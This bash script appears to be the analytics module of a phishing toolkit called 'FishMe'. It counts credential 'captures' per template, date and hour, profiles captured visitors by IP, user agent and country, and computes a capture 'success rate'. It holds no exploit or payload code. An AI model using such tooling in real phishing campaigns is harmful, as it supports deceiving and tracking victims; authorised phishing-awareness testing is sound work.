#!/bin/bash

CAPTURE_DIR="${BASE_DIR}/capture"
LOG_DIR="${BASE_DIR}/logs"

init_analytics() {
    mkdir -p "${BASE_DIR}/.cache/analytics"
}

get_total_captures() {
    local count=0
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            ((count++))
        fi
    done
    echo "$count"
}

get_captures_by_template() {
    declare -A template_counts
    
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local template
            template=$(basename "$capture_file" .json)
            template_counts[$template]=$((${template_counts[$template]:-0} + 1))
        fi
    done
    
    for template in "${!template_counts[@]}"; do
        echo "${template}:${template_counts[$template]}"
    done | sort -t: -k2 -rn
}

get_unique_ips() {
    declare -A ip_set
    
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local ip
            ip=$(jq -r '.ip // "N/A"' "$capture_file" 2>/dev/null)
            if [[ -n "$ip" && "$ip" != "N/A" ]]; then
                ip_set["$ip"]=1
            fi
        fi
    done
    
    echo "${#ip_set[@]}"
}

get_captures_by_date() {
    declare -A date_counts
    
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local timestamp
            timestamp=$(jq -r '.timestamp // "N/A"' "$capture_file" 2>/dev/null)
            local date
            date=$(echo "$timestamp" | cut -d' ' -f1)
            if [[ -n "$date" && "$date" != "N/A" ]]; then
                date_counts["$date"]=$((${date_counts[$date]:-0} + 1))
            fi
        fi
    done
    
    for date in "${!date_counts[@]}"; do
        echo "${date}:${date_counts[$date]}"
    done | sort
}

get_captures_by_hour() {
    declare -A hour_counts
    
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local timestamp
            timestamp=$(jq -r '.timestamp // "N/A"' "$capture_file" 2>/dev/null)
            local hour
            hour=$(echo "$timestamp" | cut -d' ' -f2 | cut -d':' -f1)
            if [[ -n "$hour" && "$hour" != "N/A" ]]; then
                hour_counts["$hour"]=$((${hour_counts[$hour]:-0} + 1))
            fi
        fi
    done
    
    for hour in "${!hour_counts[@]}"; do
        echo "${hour}:00-${hour_counts[$hour]}"
    done | sort -t: -k1 -n
}

get_top_user_agents() {
    declare -A ua_counts
    
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local user_agent
            user_agent=$(jq -r '.user_agent // "N/A"' "$capture_file" 2>/dev/null)
            if [[ -n "$user_agent" && "$user_agent" != "N/A" ]]; then
                ua_counts["$user_agent"]=$((${ua_counts[$user_agent]:-0} + 1))
            fi
        fi
    done
    
    for ua in "${!ua_counts[@]}"; do
        echo "${ua}:${ua_counts[$ua]}"
    done | sort -t: -k2 -rn | head -10
}

get_geo_distribution() {
    declare -A country_counts
    
    for capture_file in "${CAPTURE_DIR}"/*.json; do
        if [[ -f "$capture_file" ]]; then
            local ip
            ip=$(jq -r '.ip // "N/A"' "$capture_file" 2>/dev/null)
            if [[ -n "$ip" && "$ip" != "N/A" ]]; then
                local country
                if command -v geoiplookup &>/dev/null; then
                    country=$(geoiplookup "$ip" 2>/dev/null | grep -oP 'Country: \K[^,]+' | head -1)
                else
                    country="Unknown"
                fi
                country_counts["$country"]=$((${country_counts[$country]:-0} + 1))
            fi
        fi
    done
    
    for country in "${!country_counts[@]}"; do
        echo "${country}:${country_counts[$country]}"
    done | sort -t: -k2 -rn
}

generate_stats_report() {
    echo "FishMe Statistics Report"
    echo "========================"
    echo "Generated: $(date)"
    echo ""
    
    echo "Overview"
    echo "--------"
    echo "Total Captures: $(get_total_captures)"
    echo "Unique IPs: $(get_unique_ips)"
    echo "Templates Used: $(get_captures_by_template | wc -l)"
    echo ""
    
    echo "Captures by Template"
    echo "-------------------"
    local template_stats
    template_stats=$(get_captures_by_template)
    if [[ -n "$template_stats" ]]; then
        echo "$template_stats" | while IFS=: read -r template count; do
            printf "  %-20s %5d\n" "$template" "$count"
        done
    else
        echo "  No captures found."
    fi
    echo ""
    
    echo "Captures by Date"
    echo "----------------"
    local date_stats
    date_stats=$(get_captures_by_date)
    if [[ -n "$date_stats" ]]; then
        echo "$date_stats" | while IFS=: read -r date count; do
            printf "  %-12s %5d\n" "$date" "$count"
        done
    else
        echo "  No captures found."
    fi
    echo ""
    
    echo "Captures by Hour"
    echo "----------------"
    local hour_stats
    hour_stats=$(get_captures_by_hour)
    if [[ -n "$hour_stats" ]]; then
        echo "$hour_stats" | while IFS=: read -r hour count; do
            printf "  %-8s %5d\n" "$hour" "$count"
        done
    else
        echo "  No captures found."
    fi
    echo ""
    
    echo "Top User Agents"
    echo "---------------"
    local ua_stats
    ua_stats=$(get_top_user_agents)
    if [[ -n "$ua_stats" ]]; then
        echo "$ua_stats" | while IFS=: read -r ua count; do
            printf "  %-40s %3d\n" "${ua:0:40}..." "$count"
        done
    else
        echo "  No captures found."
    fi
    echo ""
    
    echo "Geographic Distribution"
    echo "-----------------------"
    local geo_stats
    geo_stats=$(get_geo_distribution)
    if [[ -n "$geo_stats" ]]; then
        echo "$geo_stats" | while IFS=: read -r country count; do
            printf "  %-20s %5d\n" "$country" "$count"
        done
    else
        echo "  No captures found."
    fi
}

generate_template_chart() {
    local template_stats
    template_stats=$(get_captures_by_template)
    
    if [[ -z "$template_stats" ]]; then
        echo "No captures to chart."
        return
    fi
    
    echo "Captures by Template (Chart)"
    echo "============================"
    
    local max_count=0
    while IFS=: read -r template count; do
        if [[ $count -gt $max_count ]]; then
            max_count=$count
        fi
    done <<< "$template_stats"
    
    while IFS=: read -r template count; do
        local bar_length=$(( (count * 50) / max_count ))
        local bar
        bar=$(printf '%*s' "$bar_length" | tr ' ' '█')
        printf "  %-15s │${GREEN}%s${RESET} %d\n" "$template" "$bar" "$count"
    done <<< "$template_stats"
}

generate_date_chart() {
    local date_stats
    date_stats=$(get_captures_by_date)
    
    if [[ -z "$date_stats" ]]; then
        echo "No captures to chart."
        return
    fi
    
    echo "Captures by Date (Chart)"
    echo "========================"
    
    local max_count=0
    while IFS=: read -r date count; do
        if [[ $count -gt $max_count ]]; then
            max_count=$count
        fi
    done <<< "$date_stats"
    
    while IFS=: read -r date count; do
        local bar_length=$(( (count * 50) / max_count ))
        local bar
        bar=$(printf '%*s' "$bar_length" | tr ' ' '█')
        printf "  %-12s │${GREEN}%s${RESET} %d\n" "$date" "$bar" "$count"
    done <<< "$date_stats"
}

calculate_success_rate() {
    local total_captures
    total_captures=$(get_total_captures)
    local total_visits
    total_visits=$(grep -c "GET" "${LOG_DIR}/fishme.log" 2>/dev/null || echo 0)
    
    if [[ $total_visits -gt 0 ]]; then
        local rate
        rate=$(echo "scale=2; ($total_captures * 100) / $total_visits" | bc)
        echo "${rate}%"
    else
        echo "N/A"
    fi
}

get_active_time_period() {
    local hour_stats
    hour_stats=$(get_captures_by_hour)
    
    local max_hour=""
    local max_count=0
    
    while IFS=: read -r hour count; do
        if [[ $count -gt $max_count ]]; then
            max_count=$count
            max_hour="$hour"
        fi
    done <<< "$hour_stats"
    
    if [[ -n "$max_hour" ]]; then
        echo "${max_hour}:00"
    else
        echo "N/A"
    fi
}

export_stats_json() {
    local output_file="${1:-${BASE_DIR}/exports/stats_$(date +%Y%m%d_%H%M%S).json}"
    
    local total_captures
    total_captures=$(get_total_captures)
    local unique_ips
    unique_ips=$(get_unique_ips)
    
    jq -n \
        --arg generated "$(date)" \
        --argjson total_captures "$total_captures" \
        --argjson unique_ips "$unique_ips" \
        --arg success_rate "$(calculate_success_rate)" \
        --arg active_period "$(get_active_time_period)" \
        '{
            generated: $generated,
            total_captures: $total_captures,
            unique_ips: $unique_ips,
            success_rate: $success_rate,
            active_period: $active_period
        }' > "$output_file"
    
    echo "Statistics exported to: $output_file"
}

show_quick_summary() {
    echo "Quick Summary"
    echo "============="
    echo "Total Captures: $(get_total_captures)"
    echo "Unique IPs: $(get_unique_ips)"
    echo "Success Rate: $(calculate_success_rate)"
    echo "Active Period: $(get_active_time_period)"
    echo ""
}
